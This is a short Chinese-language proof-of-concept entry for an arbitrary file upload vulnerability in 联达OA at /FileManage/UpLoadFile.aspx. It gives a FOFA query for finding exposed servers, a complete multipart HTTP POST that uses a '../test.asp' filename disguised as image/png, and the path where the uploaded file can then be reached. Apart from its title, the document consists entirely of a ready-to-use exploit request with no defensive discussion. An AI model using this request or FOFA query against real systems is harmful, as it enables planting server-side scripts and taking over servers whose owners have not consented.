## 联达OA-UpLoadFile.aspx存在任意文件上传漏洞

## fofa
```
app="联达OA"
```

## poc
```
POST /FileManage/UpLoadFile.aspx HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 241
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="DesignId"

1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../test.asp"
Content-Type: image/png

test
--00content0boundary00--
```

文件路径：
```
http://ip/FileManage/test.asp
```
